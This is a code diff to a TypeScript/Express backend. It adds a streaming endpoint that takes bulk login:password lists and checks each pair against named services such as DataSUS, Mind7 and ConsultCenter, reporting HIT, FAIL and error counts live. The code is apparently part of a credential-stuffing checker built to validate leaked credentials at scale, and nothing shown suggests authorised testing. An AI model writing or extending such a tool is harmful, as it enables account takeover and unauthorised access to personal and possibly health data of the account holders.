@@ -345,13 +345,17 @@ async function pMap<T, R>(
   items:       T[],
   fn:          (item: T, idx: number) => Promise<R>,
   concurrency: number,
+  onResult?:   (result: R, index: number) => void,
 ): Promise<R[]> {
   const results: R[] = new Array(items.length);
   let next = 0;
+  let done = 0;
   const worker = async () => {
     while (next < items.length) {
       const i = next++;
       results[i] = await fn(items[i], i);
+      done++;
+      onResult?.(results[i], done);
     }
   };
   await Promise.all(Array.from({ length: Math.min(concurrency, items.length) }, worker));
@@ -575,6 +579,71 @@ router.post("/checker/check", async (req, res): Promise<void> => {
 
   const response = await runBulk(pairs, target);
   res.json(response);
+});
+
+// POST /api/checker/stream  — Server-Sent Events, sends each result as it completes
+// Body: { credentials: string[], target: CheckerTarget }
+// Events: { type:"start", total } | { type:"result", ...CheckResult, index, total, hits, fails, errors } | { type:"done", ... }
+router.post("/checker/stream", async (req, res): Promise<void> => {
+  const { credentials, target = "iseek" } = req.body as {
+    credentials?: string[];
+    target?:      CheckerTarget;
+  };
+
+  const validTargets: CheckerTarget[] = ["iseek", "datasus", "consultcenter", "mind7"];
+  if (!validTargets.includes(target as CheckerTarget)) {
+    res.status(400).json({ error: "Invalid target" });
+    return;
+  }
+
+  if (!Array.isArray(credentials) || credentials.length === 0) {
+    res.status(400).json({ error: "credentials required" });
+    return;
+  }
+
+  const pairs = parseCredentials(credentials.join("\n"));
+  if (pairs.length === 0) {
+    res.status(400).json({ error: "No valid credentials" });
+    return;
+  }
+
+  // ── SSE setup ─────────────────────────────────────────────────────────────
+  res.setHeader("Content-Type",  "text/event-stream");
+  res.setHeader("Cache-Control", "no-cache, no-transform");
+  res.setHeader("Connection",    "keep-alive");
+  res.setHeader("X-Accel-Buffering", "no"); // disable nginx buffering
+  res.flushHeaders();
+
+  const send = (data: object) => {
+    if (!res.writableEnded) res.write(`data: ${JSON.stringify(data)}\n\n`);
+  };
+
+  let hits = 0, fails = 0, errors = 0;
+  const total = pairs.length;
+
+  send({ type: "start", total });
+
+  const checker =
+    target === "datasus"       ? checkDataSUS      :
+    target === "consultcenter" ? checkConsultCenter :
+    target === "mind7"         ? checkMind7        :
+    checkIseek;
+  const concurrency = CONCURRENCY[target];
+
+  await pMap(
+    pairs,
+    ({ login, password }) => checker(login, password),
+    concurrency,
+    (result, index) => {
+      if (result.status === "HIT")   hits++;
+      else if (result.status === "FAIL") fails++;
+      else errors++;
+      send({ type: "result", ...result, index, total, hits, fails, errors });
+    },
+  );
+
+  send({ type: "done", total, hits, fails, errors });
+  res.end();
 });
 
 export default router;
